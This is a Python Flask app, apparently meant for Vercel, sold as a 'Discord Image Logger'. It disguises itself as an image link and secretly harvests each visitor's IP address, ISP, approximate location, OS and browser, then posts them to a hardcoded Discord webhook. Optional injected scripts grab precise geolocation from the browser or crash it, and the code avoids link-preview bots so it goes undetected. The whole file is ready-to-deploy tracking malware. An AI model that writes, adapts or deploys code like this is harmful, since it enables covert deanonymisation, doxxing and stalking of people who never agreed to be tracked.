# Discord Image Logger — Flask for Vercel
# By DeKrypt | https://github.com/dekrypted

from flask import Flask, request, Response
from urllib import parse
import traceback, requests, base64, httpagentparser

app = Flask(__name__)

config = {
    "webhook": "https://discord.com/api/webhooks/1568672609850364026/r6Lh2UsEATrkUGJq9kgAAQbTI3HVzEOxkShlmFM7hGZXpHC7hbO6Vp_u84xwQkykXHFD",
    "image": "https://images.pexels.com/photos/1526/dark-blur-blurred-gradient.jpg?cs=srgb&dl=pexels-splitshire-1526.jpg&fm=jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://your-link.here"},
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [{
                "title": "Image Logger - Link Sent",
                "color": config["color"],
                "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
            }]
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

def _build_response(ip, useragent, path, url, result):
    message = config["message"]["message"]

    if config["message"]["richMessage"] and result:
        message = message.replace("{ip}", ip)
        message = message.replace("{isp}", result["isp"])
        message = message.replace("{asn}", result["as"])
        message = message.replace("{country}", result["country"])
        message = message.replace("{region}", result["regionName"])
        message = message.replace("{city}", result["city"])
        message = message.replace("{lat}", str(result["lat"]))
        message = message.replace("{long}", str(result["lon"]))
        message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
        message = message.replace("{mobile}", str(result["mobile"]))
        message = message.replace("{vpn}", str(result["proxy"]))
        message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
        message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
        message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

    if config["message"]["doMessage"]:
        data = message.encode()
    else:
        data = message.encode()

    if config["crashBrowser"]:
        data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

    if config["redirect"]["redirect"]:
        data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

    if config["accurateLocation"]:
        data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

    return Response(data, mimetype='text/html', status=200)

@app.route('/', methods=['GET', 'POST'])
def image():
    try:
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        useragent = request.headers.get('user-agent', '')

        if ip.startswith(blacklistedIPs):
            return Response(b'', mimetype='image/jpeg', status=200)

        if botCheck(ip, useragent):
            return Response(b'', mimetype='image/jpeg', status=200)

        endpoint = request.path.split("?")[0]
        url = config["image"]
        dic = dict(parse.parse_qsl(parse.urlsplit(request.path).query))
        if dic.get("url") and config["imageArgument"]:
            url = dic.get("url")

        if dic.get("g") and config["accurateLocation"]:
            location = base64.b64decode(dic.get("g").encode()).decode()
            result = makeReport(ip, useragent, location, endpoint, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=endpoint, url=url)

        return _build_response(ip, useragent, request.path, url, result)

    except Exception:
        reportError(traceback.format_exc())
        return Response(b'500 - Internal Server Error', mimetype='text/html', status=500)

@app.route('/api/image.py', methods=['GET', 'POST'])
def image_py():
    return image()